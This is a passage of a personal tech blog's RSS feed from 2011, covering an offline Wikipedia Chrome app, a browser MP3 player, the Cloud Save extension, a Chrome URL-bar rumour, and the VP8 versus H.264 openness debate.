      <description>&lt;p&gt;Google Drive launched a little less than a week ago and has introduced itself as something of a mere Dropbox clone. But I really think it has some potential for differentiating itself from Dropbox in the longer run by integrating some of the functionality of Cloud Save. I guess it’s sort of alluded to by the actual name, a Drive does more than just act as a keep safe for certain intended files, but rather wholly replaces everything. It’s the next logical step for Cloud Save that I certainly can’t take it to, deduplicating all the files on the internet so that online and offline are absolutely seamless.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Offline Wiki Chrome Webstore App</title>
      <link>http://antimatter15.com/2011/04/offline-wiki-chrome-webstore-app/</link>
      <pubDate>Sat, 23 Apr 2011 00:17:15 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/04/offline-wiki-chrome-webstore-app/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/kchecgcglnoohbdghckmcbefllnibadd?hl=en&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Offline%20Wiki%20Chrome%20Webstore%20App/Wikipedia-Google-Chrome_019.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Wikipedia - Google Chrome_019&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/kchecgcglnoohbdghckmcbefllnibadd?hl=en&quot;&gt;Offline Wiki for Chrome&lt;/a&gt; is now on the Web Store. The app that started a &lt;a href=&quot;http://antimatter15.com/2011/04/offline-wiki-chrome-webstore-app/2011/02/html5-offline-wikipedia-reader-and-help-me-win-a-cr-48/&quot;&gt;few months ago&lt;/a&gt; and took forms as &lt;a href=&quot;https://chrome.google.com/webstore/detail/mplnjjdpheipggojikpifkibnoaakkii&quot;&gt;Offline Dictionary&lt;/a&gt;. The chrome app version is much more refined, aesthetically and functionally. The search bar and autocomplete are much less obtrusive, and there’s gradients and box shadows, a sure indication of progress :)&lt;/p&gt;
&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
&lt;p&gt;The most significant difference, is that it includes the&lt;strong&gt; entire English Wikipedia&lt;/strong&gt;, a pretty close approximation of the sum of all human knowledge. Uncompressed, it’s something like 30 gigabytes of raw text, and the compressed version that I’ve compiled for this app clocks in at around 3.7 gigabytes (3.4GB for the actual compressed dump and 0.3 for the search index file). Hosting and serving up all those gigabytes does cost money, so that’s why the app isn’t free. But it’s still a pretty good value considering the equivalent apps for iOS are &lt;a href=&quot;http://www.brilliantish.com/allofwiki/&quot;&gt;twice&lt;/a&gt; &lt;a href=&quot;http://itunes.apple.com/us/app/wikipedia-offline-for-ipad/id384022310?mt=8&quot;&gt;the&lt;/a&gt; &lt;a href=&quot;http://itunes.apple.com/us/app/encyclopedia/id288141564?mt=8&quot;&gt;price&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It includes an index which lists every single article in Wikipedia, paginated and navigable through a scroll bar. There are something like 50,000 pages of the index (the exact number depends on the size of your screen), and articles are divided into columns. There’s a button which sends you to a random article, and a search bar.&lt;/p&gt;
&lt;p&gt;However the notion of this app is pretty strange: A webapp which only serves its function when offline. However, the ease of installation and use of this app is somewhat unparalleled on the desktop space. This app allows the &lt;strong&gt;browsing of the database instantly&lt;/strong&gt; after the download has begun, rather than nearly all other such apps which require the entire dump to be downloaded first. There’s no conversion process. Everything pretty much hopefully just works.&lt;/p&gt;
&lt;h2 id=&quot;html5-is-awesome-&quot;&gt;HTML5 is awesome.&lt;/h2&gt;
&lt;p&gt;The interface is done entirely with CSS and HTML, no images except the obligatory &lt;a href=&quot;http://xkcd.com/214/&quot;&gt;xkcd&lt;/a&gt; reference. The toolbar is a css3 gradient and enclosed with HTML5 tags like &amp;lt;article&amp;gt;, &amp;lt;header&amp;gt; and &amp;lt;footer&amp;gt;. The download progress is indicated by a native &amp;lt;progress&amp;gt; bar element. The index is navigable through a slider bar created using &amp;lt;input type=range&amp;gt; and all the page titles are put automatically into columns by the css3 column layout properties.&lt;/p&gt;
&lt;p&gt;The really cool stuff is what’s in the javascript. Probably the most significant development which has enabled this app is an awesome thing called the FileSystem API which exposes a special persistent sandboxed read/write directory which can be modified through the File API. When the page is first loaded, the process of downloading begins, and it uses the responseType attribute of the XMLHttpRequest to get the downloaded chunk (it just sets the request header to specify a range of one megabyte) as an array buffer. Array Buffers are a part of the WebGL specification which enables the storage and manipulation of binary data. It then uses BlobBuilder to convert that array buffer into Blob which can then be written using the File API to the hard disk.&lt;/p&gt;
&lt;p&gt;To search, it reads a small portion of the index file by using a particular slice of the file, which is the equivalent of seeking on a disk. It implements binary search to quickly locate a certain article on the disk and then reads a chunk from the dump in much the same way. Then it uses a javascript implementation of the LZMA compression algorithm to decode a certain hundred-kilobyte block into raw WikiText which is then parsed into HTML.&lt;/p&gt;
&lt;p&gt;Finally, the pushState and replaceState methods from the History API are used to handle the navigation of pages without reloading,.&lt;/p&gt;
&lt;h2 id=&quot;get-it-now&quot;&gt;Get it now&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/kchecgcglnoohbdghckmcbefllnibadd?hl=en&quot;&gt;Offline Wiki for Chrome&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>MP3 Player</title>
      <link>http://antimatter15.com/2011/03/mp3-player/</link>
      <pubDate>Sat, 26 Mar 2011 04:12:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/03/mp3-player/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/MP3%20Player/MP3-Player-Google-Chrome_014.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/MP3%20Player/MP3-Player-Google-Chrome_014.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;MP3 Player - Google Chrome_014&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is my take at an MP3 player. I would consider this one of my better designs (I’m no designer or artist, and that sort of shows). It’s fairly minimalistic, a product both of my design and the fact it was created a few hours. But this isn’t about design. No, it’s a&lt;strong&gt; music player &lt;/strong&gt;that operates&lt;strong&gt; entirely in your browser&lt;/strong&gt; with files stored on &lt;strong&gt;your hard drive&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Here’s basically how it works. There’s an &amp;lt;input type=file webkitdirectory&amp;gt; so you can go and select your music folder. It gets a list of all files, reads the first 128 kilobytes of each mp3 file and parses it for ID3 tags, constructs a library and makes it searchable.&lt;/p&gt;
&lt;p&gt;The interface is composed of four main items: a huge search bar, the music library, a playlist and the audio controls. It’s pretty self explanatory.&lt;/p&gt;
&lt;p&gt;Here it is: &lt;a href=&quot;http://antimatter15.github.com/player/player.html&quot;&gt;http://antimatter15.github.com/player/player.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It should work on Chrome, it might work on Safari, and will partially work on Firefox 4 (No directory select, no MP3). Definitely won’t work on IE9 and probably won’t work on Opera.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Cloud Save</title>
      <link>http://antimatter15.com/2011/03/cloud-save/</link>
      <pubDate>Sun, 06 Mar 2011 23:16:38 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/03/cloud-save/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Cloud%20Save/1300-cloud-save.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;I didn’t really want to write a post about yet another chrome extension, as the last five posts have somehow or another related to Google Chrome. Actually, the post I was planning to write before this was “Why the Chrome Webstore is broken”, which would be sort of less fanboy-ish. Anyway, this extension is rather simple, so I’ll probably go into the reasoning as to why I made it, where it might be headed and how I made it. There probably won’t be too much interesting information here.&lt;/p&gt;
&lt;p&gt;I wanted a Cr-48. Why? I’m not sure, partially because I don’t actually have a laptop of my own, though my brother’s Macbook Pro (which I’m typing this post on) is pretty awesome. Plus, the platform is new, non-intimidating, more or less open, and there’s such a lack of the most basic tools, that I could probably get a few twitter followers by creating web apps which did things that are really basic yet somehow the web is lacking with. Things like an offline dictionary or wikipedia dump reader. So, Chrome OS seemed cool, and probably guaranteed bragging rights, at least more so than a Google TV probably would. Due partially to my age, I’m pretty scared of using money and have this feeling that I shouldn’t spend anything on anything more than a can of soda. I guess I’ve gotten off-topic enough, and so, I wanted a Cr-48 (for free, of course).&lt;/p&gt;
&lt;p&gt;In my opinion, Google’s pretty good at copying Apple. I don’t mean that in a bad way. I wouldn’t say it’s the intention, but at least they can recognize a good feature and can copy the essence of it in a pretty functional way while for the most part, distancing from the less good parts. Unlike my feelings of what Microsoft would do, which would be to copy most of the bad parts wholesale and add some pretty fascinating and novel parts. So, if any company were to give me a free laptop, that would be awesome, but Apple certainly isn’t going to give things away, and Google’s the only company I think can properly copy the trackpad (though it appears they can’t even do that, from what I’ve read).&lt;/p&gt;
&lt;p&gt;So, that’s probably random enough, and you’re wondering how this relates to anything at all. Well, part of my quest to attain a Cr-48 involved building some pretty interesting pieces of software targeted at chrome os (but not by any means exclusive to chrome os). This included the offline dictionary and wikipedia reader. That way, if I didn’t get a Cr-48, I could have an excuse to hate Google and I might be less frequently arguing in their support. But this backup plan failed (fortunately), and I won the LucidChart Cr-48 competition by drawing a picture of a Cr48 out of flow chart components.&lt;/p&gt;
&lt;p&gt;I started using Google Groups because I could. I wasn’t spammed by google in the great spamming of some time in february, which means Google hadn’t magically picked for me to have one of those devices (I think this was before I won the LucidChart competition). So I later joined the non-involuntary group for chrome notebook pilots so I could eagerly await the knock on my door from UPS and be prepared for what to do when that happened.&lt;/p&gt;
&lt;p&gt;I skimmed through tons of random posts and eventually I noticed a pattern. People hated the file system and wanted a way to basically get rid of it. The irony is that this new Cloud that is being created, is a static collection of walled gardens. So much for progress. There’s no standard for interoperability and it hasn’t really been too important, but somehow, because of Chrome OS’s probably bad file system, people are recognizing that that this isn’t right to have an intermediary step to get data from one application to another.&lt;/p&gt;
&lt;p&gt;I’ve always held that Browsers are to improve the user experience as much as possible while keeping all of the internet on a balanced and equal platform. I felt that Extensions were the means to trigger change to a specific group of websites or a general heuristic in order to make a more perfect experience. I thought of that while making drag2up, which creates a novel and useful feature which should be used by everybody. As part of building it, I ended up with a sort of OCD toward creating an implementation of every imaginable file host.&lt;/p&gt;
&lt;p&gt;Cloud Save’s heritage is probably as much owed to drag2up as it is to Clip It Good, the latter of which I’ve never actually used, but found it inspiring nonetheless (and I ripped the Picasa implementation out of it too). Clip It Good was the general idea for Cloud Save, except that Cloud Save had more hosts. I made Cloud Save in thirty one minutes and thirty nine seconds, give or take a minute or so. The fact it was made in a mere half hour shows how the idea isn’t novel at all. In fact, most of those minutes were spent setting up the directory structure, manifest, installing inkscape, downloading the tango icon set and unzipping the icons to steal the save action icon (much like how I stole the up arrow icon used as drag2up’s logo). Nearly all of Cloud Save was the code needed to create the context menu. The downloading from URL, authentication and upload stuff was already in drag2up (I myself was pretty impressed about this. Evidently, I forgot how many features I had put into drag2up.).&lt;/p&gt;
&lt;p&gt;Cloud Save wasn’t meant as a sort of glorified bookmark system. Or as a means to politely reshare images without hotlinking. I thought the need was to bypass the physical filesystem. That’s why the application is target primarily toward services which provide a virtual file system: a directory structure, files, privacy, etc. It wasn’t ever really intended as a means to share files, but I guess this is what people want it to do, so I’ll probably make the extension more sharing oriented in the future.&lt;/p&gt;
&lt;p&gt;I realized I just forgot the rest of what I was about to write about, so I guess I’ll end it rather abruptly here. This morning, at 11 AM (though I don’t know if this date has been adjusted for my time zone) when I was still probably in school, Lifehacker posted about it and now people are using it. Awesome. I didn’t expect this to be that significant.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Won't Kill Chrome URL Bar</title>
      <link>http://antimatter15.com/2011/02/google-won-t-kill-chrome-url-bar/</link>
      <pubDate>Mon, 21 Feb 2011 01:50:17 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/02/google-won-t-kill-chrome-url-bar/</guid>
      <author></author>
      <description>&lt;p&gt;I saw &lt;a href=&quot;http://code.google.com/p/chromium-os/issues/detail?id=3220&amp;amp;can=1&amp;amp;q=compact%20nav%20bar&amp;amp;colspec=ID%20Stars%20Pri%20Area%20Type%20Status%20Summary%20Modified%20Owner%20Mstone&quot;&gt;this article &lt;/a&gt;on hacker news and slashdot recently about how Google might remove the URL bar from future versions of Chrome. It’s almost definitely not true.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;http://f.cl.ly/items/0E3c0c301Z2M040S0v2o/compact_navpng&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;First off, &lt;a href=&quot;http://dev.chromium.org/chromium-os/user-experience/window-ui&quot;&gt;the images are about Chrome OS&lt;/a&gt;. Not Chrome. The page doesn’t signal any intent to change the behavior of “Chromium-based browsers”. Side tabs and the contact nav bar make sense on Chrome OS because netbooks such as those Chrome OS is targeting tend to be really wide with very little vertical space. There’s also generally not much RAM so having lots of tabs isn’t practical.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Google%20Won%27t%20Kill%20Chrome%20URL%20Bar/NavigationButtons.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;The compact nav bar as it was known existed in builds of Chrome OS from late 2009 (when it was open sourced) and 2010. But it’s &lt;a href=&quot;http://code.google.com/p/chromium/issues/detail?id=37979#c9&quot;&gt;been discontinued&lt;/a&gt; and the page hasn’t been updated for almost a year.&lt;/p&gt;
&lt;p&gt;A quick search on the chromium bug tracker for the&lt;a href=&quot;http://code.google.com/p/chromium/issues/list?can=1&amp;amp;q=compact+nav+bar&amp;amp;colspec=ID+Stars+Pri+Area+Feature+Type+Status+Summary+Modified+Owner+Mstone+OS&amp;amp;cells=tiles&quot;&gt; compact nav bar&lt;/a&gt; shows that nearly all the bugs related to it have been marked WontFix. It’s been discontinued for over 7 months.
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Google%20Won%27t%20Kill%20Chrome%20URL%20Bar/Selection_012.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Google%20Won%27t%20Kill%20Chrome%20URL%20Bar/Selection_013.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;And please follow me on &lt;a href=&quot;http://twitter.com/antimatter15&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>HTML5 Offline Wikipedia Reader and Help me win a Cr-48</title>
      <link>http://antimatter15.com/2011/02/html5-offline-wikipedia-reader-and-help-me-win-a-cr-48/</link>
      <pubDate>Thu, 03 Feb 2011 20:21:03 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/02/html5-offline-wikipedia-reader-and-help-me-win-a-cr-48/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://www.lucidchart.com/community/examples/view/4d40ad1f-f1b0-44a7-b39b-1db00ac17bf0&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/HTML5%20Offline%20Wikipedia%20Reader%20and%20Help%20me%20win%20a%20Cr-48/690-11.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;690 (1)&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So, lets begin with a plead for you to &lt;a href=&quot;http://www.lucidchart.com/community/examples/view/4d40ad1f-f1b0-44a7-b39b-1db00ac17bf0&quot;&gt;rate my submission (ideally favorably)&lt;/a&gt; for the LucidChart chrome notebook contest, partly because it would be awesome, and I need to test the aforementioned HTML5 offline Wikipedia dump reader.&lt;/p&gt;
&lt;p&gt;Wikipedia is awesome, and on my service-less iPhone 2G, one of the most useful apps is one with an outdated (by something like three years) Wikipedia dump reader. There’s something very &lt;a href=&quot;http://xkcd.com/548/&quot;&gt;much like the Hitchhiker’s Guide &lt;/a&gt;in carrying the “sum of all human knowledge” in one’s pocket. Wikipedia grows really quickly and the English language dump (as of last month at time of writing) is over six gigs of bzipped XML.&lt;/p&gt;
&lt;p&gt;Another reason for building an offline Wikipedia dump reader is simply that I can. There’s a lot of cool and cutting edge stuff in this. It uses the file input JS API, FileReader, Blobs, WebWorkers, fast Javascript to handle a pure-JS implementation of the LZMA compression algorithm, and the FileSystem API.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2011/HTML5%20Offline%20Wikipedia%20Reader%20and%20Help%20me%20win%20a%20Cr-48/Internet-Google-Chrome_002.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/HTML5%20Offline%20Wikipedia%20Reader%20and%20Help%20me%20win%20a%20Cr-48/Internet-Google-Chrome_002.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Internet - Google Chrome_002&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;All this stuff has only been possible for a very short amount of time. In fact, the FileSystem API only arrived with the release of Chrome 9 today. It’s pretty awesome to imagine that a web page, HTML and Javascript is processing multiple gigabytes of data at real time. At the current unoptimized state, the search results and the article shows up instantly within 100ms of a key press event (However, I admit it has yet to be tested on the actual English Wikipedia).&lt;/p&gt;
&lt;p&gt;This app is almost ideally suited for Chrome OS. A hundred megabytes worth of data in a month (with the Verizon deal, not to mention that it’s limited to two years) isn’t very much and it would be a pity for the sixteen gigabytes of SSD space on a Cr-48 to be wasted. One of the dumps that I’ve compiled is a subset of the English Wiktionary which makes a great lightweight (8MB) dictionary with over sixty five thousand words. Wiktionary is fairly large at 217MB, and the Simple English Wikipedia is 51MB.
&lt;a href=&quot;/articles/2011/HTML5%20Offline%20Wikipedia%20Reader%20and%20Help%20me%20win%20a%20Cr-48/interned-Google-Chrome_004.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/HTML5%20Offline%20Wikipedia%20Reader%20and%20Help%20me%20win%20a%20Cr-48/interned-Google-Chrome_004.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;interned - Google Chrome_004&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;
Assuming you can somehow access the dumps, I probably won’t post them on this server because of the massive bandwidth usage, someone else could, the process for using it is very simple. Download the file to your  computer through HTTP, a torrent, or create it yourself. You might have noticed that the favicon is a picture of a carrot because that’s the current codename. Well, not really a codename, but I was scrolling through some icon lists and saw one for a carrot on the first page. I don’t even like carrots, but I digress. The dump uploading screen has a picture of a bunny biting a file upload carrot that you click on to select the file. Select the file, and it automagically copies it over to a persistent folder. Then you’re off to searching and reading articles and definitions :)&lt;/p&gt;
&lt;p&gt;I’m not done yet, or at least, I don’t feel like packaging it up and submitting it to the chrome webstore yet because I need to figure out a good way to host database dumps.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>The Ambiguity of &quot;Open&quot; and VP8 vs. H.264</title>
      <link>http://antimatter15.com/2011/01/the-ambiguity-of-open-and-vp8-vs-h-264/</link>
      <pubDate>Thu, 13 Jan 2011 00:38:27 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/01/the-ambiguity-of-open-and-vp8-vs-h-264/</guid>
      <author></author>
      <description>&lt;p&gt;Google has recently announced their intention to &lt;a href=&quot;http://blog.chromium.org/2011/01/html-video-codec-support-in-chrome.html&quot;&gt;remove the H.264&lt;/a&gt; video codec from its Chrome browser. This decision has been smeared as an evil campaign for controlling video on the web, akin to &lt;a href=&quot;http://en.wikipedia.org/wiki/Not_Invented_Here&quot;&gt;not-invented-here&lt;/a&gt; syndrome. It’s also been lauded as the push that the web needs to&lt;a href=&quot;http://www.osnews.com/story/24245/10_Questions_for_John_Gruber_Regarding_H_264_WebM&quot;&gt; remain open &lt;/a&gt;and free.&lt;a href=&quot;http://daringfireball.net/2011/01/simple_questions&quot;&gt; Mostly, it’s been marked as inconsistent,&lt;/a&gt; due to the bundling of Adobe’s proprietary Flash player.&lt;/p&gt;
&lt;p&gt;Richard Stallman &lt;a href=&quot;http://www.gnu.org/philosophy/open-source-misses-the-point.html&quot;&gt;doesn’t like the term Open Source&lt;/a&gt; because it fails to embody the true meaning of “free software”, and the one thing that’s worse is the word “open”. This debate can’t simply be labeled as one for or against openness (even ignoring the technical details).&lt;/p&gt;
&lt;p&gt;H.264 is an open standard. It was developed by a committee, standardized, reviewed by many engineers and developers for multiple companies and has been standardized for use with a multitude of containers and devices. However, H.264 is not royalty free. Software patents in many countries restrict the distribution of software that utilizes the codec to those who pay the MPEG-LA.&lt;/p&gt;
&lt;p&gt;VP8 is not a standard. It was developed secretly by a single company, and until recently, had only a single working implementation. The public wasn’t open to collaboration on the specification until the bitstream spec was frozen, including the bugs that existed within. Now, the source code and reference implementation are available under liberal licenses, and all the related patents are irrevocably royalty-free.&lt;/p&gt;
&lt;p&gt;Adobe Flash, while not synonymous with a video codec (unless you mean .flv flash videos, which are either VP6 or Sorenson Spark), is going here anyway because everyone feels like comparing it. Flash’s SWF format is not standard, but it is open. There are a few implementations (Swfdec, Gnash, GameSWF, Gordon, etc), but none of them are as complete as the official proprietary implementation. There’s a &lt;a href=&quot;http://www.adobe.com/content/dam/Adobe/en/devnet/swf/pdf/swf_file_format_spec_v10.pdf&quot;&gt;bitstream specification&lt;/a&gt; that anyone can read to create an independent implementation of the player. Implementing and using the Flash player is still royalty-free (Since the Flash VM can decode H.264, obviously that part, not controlled by Adobe still has royalties), anyone can make software that can export SWF animations without paying Adobe.&lt;/p&gt;
&lt;h2 id=&quot;implementation-vs-distribution&quot;&gt;Implementation vs. Distribution&lt;/h2&gt;
&lt;h4 id=&quot;or-how-bundling-flash-doesn-t-violate-the-novikov-self-consistency-principle-http-en-wikipedia-org-wiki-novikov_self-consistency_principle-&quot;&gt;Or: How Bundling Flash doesn’t violate the &lt;a href=&quot;http://en.wikipedia.org/wiki/Novikov_self-consistency_principle&quot;&gt;Novikov self-consistency principle&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;table&gt;&lt;/p&gt;
&lt;p&gt;&lt;tbody&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Name&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Standardization&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Implementation&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Distribution&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Dev History&lt;/th&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;Theora&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ffff00;&quot;&gt;Standardized?&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Open Source&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Royalty Free&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Mostly Open&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;VP8&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Not Standardized&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Open Source&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Royalty Free&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ffff00;&quot;&gt;Mixed&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;H.264&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Standardized&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Open Source&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Royalties&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Open&lt;/td&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;td&gt;&lt;strong&gt;Flash*&lt;/strong&gt;&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Not Standardized&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Proprietary&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #99cc00;&quot;&gt;Royalty Free&lt;/td&gt;&lt;/p&gt;
&lt;p&gt;&lt;td style=&quot;background-color: #ff9999;&quot;&gt;Proprietary&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;em&gt;* Adobe Flash isn’t a video codec&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Each column of the chart can be treated as one part of “open”. The &amp;lt;video&amp;gt; debate now primarily concerns VP8 and H.264, as Theora is inferior for technical reasons and Flash isn’t a video codec. I don’t know if Theora’s actually standardized, but it has multiple implementations and was developed by the Xiph.Org foundation, and is the closest thing to an actual standard, short of being a product of MPEG. Theora was created from On2’s VP3 code, but was changed significantly by the Xiph.org Foundation before release, so the development history can be considered mostly open. VP8 as announced, and the bitstream was frozen shortly afterwards, leaving little community involvement. For the years before its debut as part of WebM, the format was secret, patent encumbered, and proprietary. At least now, the source code is open and people are free to do whatever they please, but the open source video community probably had very little say in the development of the codec. H.264 has an open software reference implementation, as does VP8 and Theora. Flash’s de-facto implementation is Adobe’s, which is proprietary.&lt;/p&gt;
&lt;p&gt;The one that concerns Mozilla, Opera and Google is the distribution rights; whether or not royalties have to be paid. Notably, this is where the parallel drawn by most critics of Google’s move with H.264 and Flash comes into question. Many people believe that Flash is the epitome of evil, and proprietary software, and embodies everything wrong with proprietary software. The distribution column is arguably the most important, and it’s the one that fundamentally determines whether or not something acts as a detriment to “open innovation”. Flash animations and applications can be created and distributed without paying royalty fees to Adobe, regardless of the viewership. Innovation is still permitted as long as the distribution is free (except with changing the inner workings of the proprietary implementation).&lt;/p&gt;
&lt;h2 id=&quot;the-ambiguity-of-plugin-&quot;&gt;The Ambiguity of “Plugin”&lt;/h2&gt;
&lt;h4 id=&quot;todo-use-this-subtitle-to-mention-random-tangential-thoughts-&quot;&gt;TODO: Use this subtitle to mention random tangential thoughts.&lt;/h4&gt;
&lt;p&gt;It seems there are lots of misconceptions about WebM, and new ones as well, because of the use of the word “plugin” by Google in their “&lt;a href=&quot;http://blog.chromium.org/2011/01/more-about-chrome-html-video-codec.html&quot;&gt;More about Chrome HTML Codec Change&lt;/a&gt;“. Here’s what the relevant part of the post says (it’s buried into the last paragraph).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This is why we’re joining others in the community to invest in WebM and encouraging every browser vendor to adopt it for the emerging HTML video platform (the WebM Project team will &lt;strong&gt;soon release plugins&lt;/strong&gt; that enable WebM support in Safari and IE9 via the HTML standard &amp;lt;video&amp;gt; tag).
Microsoft and Apple through IE9 and Safari, respectively, rely on the underlying operating system’s multimedia frameworks to handle &amp;lt;video&amp;gt; decoding. Chrome and Chromium bundle a customized version of the ffmpeg framework, while Opera uses gstreamer and Firefox has its own framework built on various open source codec libraries.&lt;/p&gt;
&lt;p&gt;&lt;table&gt;&lt;/p&gt;
&lt;p&gt;&lt;tbody&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Browser&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;WebM&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;H.264&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Theora&lt;/th&gt;&lt;/p&gt;
&lt;p&gt;&lt;th&gt;Anything Imaginable&lt;/th&gt;
&lt;/tr&gt;&lt;/p&gt;
&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
